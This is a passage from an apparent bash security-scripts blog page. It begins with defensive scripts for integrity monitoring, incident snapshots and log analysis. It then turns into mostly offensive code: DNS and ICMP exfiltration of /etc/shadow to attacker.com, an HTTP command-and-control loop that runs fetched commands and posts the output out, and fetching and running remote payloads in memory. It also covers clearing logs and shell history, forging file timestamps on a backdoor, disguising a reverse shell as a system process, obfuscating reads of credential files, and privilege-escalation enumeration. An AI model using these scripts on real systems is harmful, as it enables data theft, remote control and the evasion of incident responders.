+</span></span></code></pre></div><p>Looks for common shell tools. Not foolproof (attackers can rename binaries) but catches basic shells.</p><h3 id=file-integrity-monitoring>File Integrity Monitoring<a href=#file-integrity-monitoring class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Simple integrity checker</span>
+</span></span><span style=display:flex><span>CRITICAL_DIRS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/bin /sbin /usr/bin /etc&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Create baseline</span>
+</span></span><span style=display:flex><span>create_baseline<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> dir in $CRITICAL_DIRS; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        find $dir -type f -exec sha256sum <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> &gt; /var/lib/fim/baseline_<span style=color:#66d9ef>$(</span>basename $dir<span style=color:#66d9ef>)</span>.txt
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Check integrity</span>
+</span></span><span style=display:flex><span>check_integrity<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> dir in $CRITICAL_DIRS; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        baseline<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/var/lib/fim/baseline_</span><span style=color:#66d9ef>$(</span>basename $dir<span style=color:#66d9ef>)</span><span style=color:#e6db74>.txt&#34;</span>
+</span></span><span style=display:flex><span>        current<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>        find $dir -type f -exec sha256sum <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> &gt; $current
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ! diff $baseline $current &gt; /dev/null; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>            echo <span style=color:#e6db74>&#34;ALERT: Changes detected in </span>$dir<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>            diff $baseline $current | grep <span style=color:#e6db74>&#34;^&lt;&#34;</span> | awk <span style=color:#e6db74>&#39;{print $2}&#39;</span> | 
+</span></span><span style=display:flex><span>                mail -s <span style=color:#e6db74>&#34;File Integrity Alert&#34;</span> admin@example.com
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>        rm $current
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Run check</span>
+</span></span><span style=display:flex><span>check_integrity
+</span></span></code></pre></div><p>Hash critical files. Compare against baseline. Alert on changes. Basic but effective.</p><h2 id=incident-response>Incident Response<a href=#incident-response class=hanchor arialabel=Anchor>#</a></h2><h3 id=system-snapshot>System Snapshot<a href=#system-snapshot class=hanchor arialabel=Anchor>#</a></h3><p>When you detect an incident, capture state immediately:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Quick incident snapshot</span>
+</span></span><span style=display:flex><span>TIMESTAMP<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>date +%Y%m%d_%H%M%S<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>OUTDIR<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/tmp/incident_</span>$TIMESTAMP<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>mkdir -p $OUTDIR
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># System info</span>
+</span></span><span style=display:flex><span>hostname &gt; $OUTDIR/hostname
+</span></span><span style=display:flex><span>date &gt; $OUTDIR/timestamp
+</span></span><span style=display:flex><span>uptime &gt; $OUTDIR/uptime
+</span></span><span style=display:flex><span>uname -a &gt; $OUTDIR/uname
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Users</span>
+</span></span><span style=display:flex><span>who &gt; $OUTDIR/users_logged_in
+</span></span><span style=display:flex><span>w &gt; $OUTDIR/users_activity
+</span></span><span style=display:flex><span>last -20 &gt; $OUTDIR/recent_logins
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Processes</span>
+</span></span><span style=display:flex><span>ps auxf &gt; $OUTDIR/processes_tree
+</span></span><span style=display:flex><span>ps aux --sort<span style=color:#f92672>=</span>-%cpu | head -20 &gt; $OUTDIR/top_cpu
+</span></span><span style=display:flex><span>ps aux --sort<span style=color:#f92672>=</span>-%mem | head -20 &gt; $OUTDIR/top_memory
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Network</span>
+</span></span><span style=display:flex><span>netstat -tunap &gt; $OUTDIR/network_connections
+</span></span><span style=display:flex><span>ss -tunap &gt; $OUTDIR/socket_stats
+</span></span><span style=display:flex><span>iptables -L -n -v &gt; $OUTDIR/firewall_rules
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Files</span>
+</span></span><span style=display:flex><span>find / -type f -mtime -1 2&gt;/dev/null &gt; $OUTDIR/recently_modified
+</span></span><span style=display:flex><span>lsof &gt; $OUTDIR/open_files
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Package everything</span>
+</span></span><span style=display:flex><span>tar -czf incident_$TIMESTAMP.tar.gz $OUTDIR
+</span></span><span style=display:flex><span>rm -rf $OUTDIR
+</span></span></code></pre></div><p>Captures system state. Everything you need for initial analysis. Takes 30 seconds to run.</p><h3 id=live-memory-dump>Live Memory Dump<a href=#live-memory-dump class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Capture process memory (requires root)</span>
+</span></span><span style=display:flex><span>PID<span style=color:#f92672>=</span>$1
+</span></span><span style=display:flex><span>MAPS<span style=color:#f92672>=</span>/proc/$PID/maps
+</span></span><span style=display:flex><span>MEM<span style=color:#f92672>=</span>/proc/$PID/mem
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> read line; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    start<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $line | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | cut -d<span style=color:#e6db74>&#39;-&#39;</span> -f1<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    end<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $line | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | cut -d<span style=color:#e6db74>&#39;-&#39;</span> -f2<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    perms<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo $line | awk <span style=color:#e6db74>&#39;{print $2}&#39;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Only dump readable memory regions</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> $perms <span style=color:#f92672>=</span>~ r <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;Dumping </span>$start<span style=color:#e6db74>-</span>$end<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>        dd <span style=color:#66d9ef>if</span><span style=color:#f92672>=</span>$MEM bs<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> skip<span style=color:#f92672>=</span><span style=color:#66d9ef>$((</span><span style=color:#ae81ff>0</span>x$start<span style=color:#66d9ef>))</span> count<span style=color:#f92672>=</span><span style=color:#66d9ef>$((</span><span style=color:#ae81ff>0</span>x$end <span style=color:#f92672>-</span> <span style=color:#ae81ff>0</span>x$start<span style=color:#66d9ef>))</span> <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span>            of<span style=color:#f92672>=</span>memory_<span style=color:#e6db74>${</span>PID<span style=color:#e6db74>}</span>_<span style=color:#e6db74>${</span>start<span style=color:#e6db74>}</span>.dump 2&gt;/dev/null
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span> &lt; $MAPS
+</span></span></code></pre></div><p>Dumps process memory. Useful for malware analysis. Can extract credentials, network connections, decrypted data.</p><h3 id=log-analysis>Log Analysis<a href=#log-analysis class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Find commands run by specific user</span>
+</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#34;sudo:&#34;</span> /var/log/auth.log | grep <span style=color:#e6db74>&#34;USER=root&#34;</span> | grep <span style=color:#e6db74>&#34;COMMAND=&#34;</span> | 
+</span></span><span style=display:flex><span>    awk -F<span style=color:#e6db74>&#39;COMMAND=&#39;</span> <span style=color:#e6db74>&#39;{print $2}&#39;</span> | sort | uniq -c | sort -nr
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Find successful logins from unexpected IPs</span>
+</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#34;Accepted&#34;</span> /var/log/auth.log | 
+</span></span><span style=display:flex><span>    awk <span style=color:#e6db74>&#39;{print $11}&#39;</span> | 
+</span></span><span style=display:flex><span>    grep -v <span style=color:#e6db74>&#34;192.168.1.&#34;</span> | 
+</span></span><span style=display:flex><span>    sort | uniq
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Find login attempts outside business hours</span>
+</span></span><span style=display:flex><span>grep <span style=color:#e6db74>&#34;session opened&#34;</span> /var/log/auth.log | 
+</span></span><span style=display:flex><span>    awk <span style=color:#e6db74>&#39;{print $1&#34; &#34;$2&#34; &#34;$3}&#39;</span> | 
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> read date; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>        hour<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>date -d <span style=color:#e6db74>&#34;</span>$date<span style=color:#e6db74>&#34;</span> +%H<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> $hour -lt <span style=color:#ae81ff>7</span> <span style=color:#f92672>||</span> $hour -gt <span style=color:#ae81ff>18</span> <span style=color:#f92672>]]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>            echo <span style=color:#e6db74>&#34;After-hours login: </span>$date<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Log analysis without specialized tools. Grep, awk, sed. Works everywhere.</p><h2 id=covert-channels>Covert Channels<a href=#covert-channels class=hanchor arialabel=Anchor>#</a></h2><h3 id=dns-exfiltration>DNS Exfiltration<a href=#dns-exfiltration class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Split data into DNS-safe chunks</span>
+</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>cat /etc/shadow | base64 | tr -d <span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> chunk in <span style=color:#66d9ef>$(</span>echo $data | fold -w 63<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    host <span style=color:#e6db74>${</span>chunk<span style=color:#e6db74>}</span>.exfil.attacker.com &gt;/dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>    sleep <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>DNS queries don&rsquo;t look suspicious. Most firewalls allow them. Each query exfiltrates 63 bytes.</p><p>Attacker runs DNS server. Logs all queries. Reconstructs data from query names.</p><h3 id=icmp-tunneling>ICMP Tunneling<a href=#icmp-tunneling class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Encode data in ICMP packet payload</span>
+</span></span><span style=display:flex><span>message<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;secret data&#34;</span>
+</span></span><span style=display:flex><span>hex<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo -n <span style=color:#e6db74>&#34;</span>$message<span style=color:#e6db74>&#34;</span> | xxd -p | tr -d <span style=color:#e6db74>&#39;\n&#39;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>ping -c <span style=color:#ae81ff>1</span> -p $hex attacker.com &gt;/dev/null 2&gt;&amp;<span style=color:#ae81ff>1</span>
+</span></span></code></pre></div><p>ICMP typically allowed through firewalls (for troubleshooting). Can encode data in ping payload.</p><h3 id=http-steganography>HTTP Steganography<a href=#http-steganography class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Hide commands in legitimate-looking HTTP traffic</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> true; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Fetch page, extract hidden command</span>
+</span></span><span style=display:flex><span>    cmd<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>curl -s https://legitimate-site.com/index.html | 
+</span></span><span style=display:flex><span>          grep -o <span style=color:#e6db74>&#39;&lt;!-- [a-zA-Z0-9+/=]\+ --&gt;&#39;</span> | 
+</span></span><span style=display:flex><span>          sed <span style=color:#e6db74>&#39;s/&lt;!-- \(.*\) --&gt;/\1/&#39;</span> | 
+</span></span><span style=display:flex><span>          base64 -d<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -n <span style=color:#e6db74>&#34;</span>$cmd<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># Execute command, exfiltrate result</span>
+</span></span><span style=display:flex><span>        result<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>eval <span style=color:#e6db74>&#34;</span>$cmd<span style=color:#e6db74>&#34;</span> 2&gt;&amp;<span style=color:#ae81ff>1</span> | base64<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>        curl -s -X POST <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span>            -H <span style=color:#e6db74>&#34;User-Agent: Mozilla/5.0&#34;</span> <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span>            -H <span style=color:#e6db74>&#34;X-Analytics: </span>$result<span style=color:#e6db74>&#34;</span> <span style=color:#ae81ff>\
+</span></span></span><span style=display:flex><span>            https://legitimate-site.com/analytics &gt;/dev/null
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>fi</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    sleep <span style=color:#ae81ff>300</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span></code></pre></div><p>Command hidden in HTML comment. Result exfiltrated in HTTP header. Looks like normal web traffic.</p><h2 id=memory-only-execution>Memory-Only Execution<a href=#memory-only-execution class=hanchor arialabel=Anchor>#</a></h2><p>Leave no traces on disk:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Execute remote script without writing to disk</span>
+</span></span><span style=display:flex><span>bash &lt;<span style=color:#f92672>(</span>curl -s https://attacker.com/payload.sh<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Load malware into memory-only filesystem</span>
+</span></span><span style=display:flex><span>mount -t tmpfs -o size<span style=color:#f92672>=</span>10M tmpfs /tmp/ramdisk
+</span></span><span style=display:flex><span>cd /tmp/ramdisk
+</span></span><span style=display:flex><span>curl -s https://attacker.com/malware -o malware
+</span></span><span style=display:flex><span>chmod +x malware
+</span></span><span style=display:flex><span>./malware
+</span></span></code></pre></div><p>Everything in <code>/tmp/ramdisk</code> disappears on reboot. No disk forensics. No file recovery.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Execute base64-encoded payload from environment variable</span>
+</span></span><span style=display:flex><span>export PAYLOAD<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;IyEvYmluL2Jhc2gKZWNobyAiUGF5bG9hZCBleGVjdXRlZCI=&#39;</span>
+</span></span><span style=display:flex><span>bash &lt;<span style=color:#f92672>(</span>echo $PAYLOAD | base64 -d<span style=color:#f92672>)</span>
+</span></span></code></pre></div><p>Payload never touches disk. Lives in environment variable. Executed directly.</p><h2 id=anti-forensics>Anti-Forensics<a href=#anti-forensics class=hanchor arialabel=Anchor>#</a></h2><h3 id=clear-tracks>Clear Tracks<a href=#clear-tracks class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Clear history</span>
+</span></span><span style=display:flex><span>unset HISTFILE
+</span></span><span style=display:flex><span>export HISTFILESIZE<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>history -c
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Clear logs (if you have write access)</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> log in /var/log/<span style=color:#f92672>{</span>auth.log,syslog,messages<span style=color:#f92672>}</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span> -w <span style=color:#e6db74>&#34;</span>$log<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> cat /dev/null &gt; $log
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Remove specific entries from history</span>
+</span></span><span style=display:flex><span>history | grep <span style=color:#e6db74>&#34;sensitive command&#34;</span> | awk <span style=color:#e6db74>&#39;{print $1}&#39;</span> | xargs -I <span style=color:#f92672>{}</span> history -d <span style=color:#f92672>{}</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Disable history for current session</span>
+</span></span><span style=display:flex><span>set +o history
+</span></span></code></pre></div><p>Won&rsquo;t stop forensics entirely. But removes obvious traces.</p><h3 id=timestamp-manipulation>Timestamp Manipulation<a href=#timestamp-manipulation class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Copy timestamps from legitimate file</span>
+</span></span><span style=display:flex><span>touch -r /bin/ls /tmp/backdoor
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Set specific timestamp</span>
+</span></span><span style=display:flex><span>touch -t 202301010000.00 /tmp/backdoor
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Batch timestamp modification</span>
+</span></span><span style=display:flex><span>find /tmp/malicious_dir -type f -exec touch -r /bin/ls <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span>
+</span></span></code></pre></div><p>Makes malicious files look as old as system binaries. Defeats timeline analysis.</p><h3 id=process-hiding>Process Hiding<a href=#process-hiding class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Rename process to look legitimate</span>
+</span></span><span style=display:flex><span>exec -a <span style=color:#e6db74>&#34;[kworker/0:0]&#34;</span> bash -c <span style=color:#e6db74>&#39;while true; do sleep 60; done&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Or mimic system process</span>
+</span></span><span style=display:flex><span>exec -a <span style=color:#e6db74>&#34;/usr/lib/systemd/systemd-timesyncd&#34;</span> bash reverse_shell.sh
+</span></span></code></pre></div><p>Process shows up as kernel worker or system daemon in <code>ps</code>. Not foolproof (deeper inspection reveals it) but defeats casual observation.</p><h2 id=evasion-techniques>Evasion Techniques<a href=#evasion-techniques class=hanchor arialabel=Anchor>#</a></h2><h3 id=string-obfuscation>String Obfuscation<a href=#string-obfuscation class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Avoid plaintext &#34;wget&#34; in scripts</span>
+</span></span><span style=display:flex><span>w<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;w&#39;</span>; g<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;get&#39;</span>
+</span></span><span style=display:flex><span>$w$g http://attacker.com/payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Hex encoding</span>
+</span></span><span style=display:flex><span>cmd<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo -n <span style=color:#e6db74>&#39;cat /etc/shadow&#39;</span> | xxd -p<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>eval <span style=color:#66d9ef>$(</span>echo $cmd | xxd -r -p<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Variable indirection</span>
+</span></span><span style=display:flex><span>c<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;c&#39;</span>; a<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;a&#39;</span>; t<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;t&#39;</span>
+</span></span><span style=display:flex><span>$c$a$t /etc/passwd
+</span></span></code></pre></div><p>Makes static analysis harder. Defeats basic string searches.</p><h3 id=encoding-techniques>Encoding Techniques<a href=#encoding-techniques class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Base64 everything</span>
+</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Y2F0IC9ldGMvcGFzc3dk&#39;</span>
+</span></span><span style=display:flex><span>eval <span style=color:#66d9ef>$(</span>echo $payload | base64 -d<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># ROT13 for obfuscation (not security)</span>
+</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#39;cat /etc/passwd&#39;</span> | tr <span style=color:#e6db74>&#39;A-Za-z&#39;</span> <span style=color:#e6db74>&#39;N-ZA-Mn-za-m&#39;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>eval <span style=color:#66d9ef>$(</span>echo $payload | tr <span style=color:#e6db74>&#39;A-Za-z&#39;</span> <span style=color:#e6db74>&#39;N-ZA-Mn-za-m&#39;</span><span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Compression</span>
+</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>echo <span style=color:#e6db74>&#39;cat /etc/shadow&#39;</span> | gzip | base64<span style=color:#66d9ef>)</span>
+</span></span><span style=display:flex><span>eval <span style=color:#66d9ef>$(</span>echo $payload | base64 -d | gunzip<span style=color:#66d9ef>)</span>
+</span></span></code></pre></div><p>Multiple layers of encoding. Harder to detect. Harder to analyze.</p><h2 id=practical-security-scripts>Practical Security Scripts<a href=#practical-security-scripts class=hanchor arialabel=Anchor>#</a></h2><h3 id=privilege-escalation-check>Privilege Escalation Check<a href=#privilege-escalation-check class=hanchor arialabel=Anchor>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#!/bin/bash
+</span></span></span><span style=display:flex><span><span style=color:#75715e># Quick privesc enumeration</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] SUID binaries:&#34;</span>
+</span></span><span style=display:flex><span>find / -perm -4000 -type f 2&gt;/dev/null
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Writable directories in PATH:&#34;</span>
+</span></span><span style=display:flex><span>echo $PATH | tr <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#e6db74>&#39;\n&#39;</span> | <span style=color:#66d9ef>while</span> read dir; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    <span style=color:#f92672>[</span> -w <span style=color:#e6db74>&#34;</span>$dir<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]</span> <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;</span>$dir<span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] World-writable files:&#34;</span>
+</span></span><span style=display:flex><span>find / -perm -2 -type f -not -path <span style=color:#e6db74>&#34;/proc/*&#34;</span> 2&gt;/dev/null | head -20
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Capabilities:&#34;</span>
+</span></span><span style=display:flex><span>getcap -r / 2&gt;/dev/null
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Sudo permissions:&#34;</span>
+</span></span><span style=display:flex><span>sudo -l 2&gt;/dev/null
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Cron jobs:&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> user in <span style=color:#66d9ef>$(</span>cut -f1 -d: /etc/passwd<span style=color:#66d9ef>)</span>; <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>    crontab -u $user -l 2&gt;/dev/null | grep -v <span style=color:#e6db74>&#34;^#&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Readable /etc/shadow:&#34;</span>
+</span></span><span style=display:flex><span>test -r /etc/shadow <span style=color:#f92672>&amp;&amp;</span> echo <span style=color:#e6db74>&#34;/etc/shadow is readable!&#34;</span>
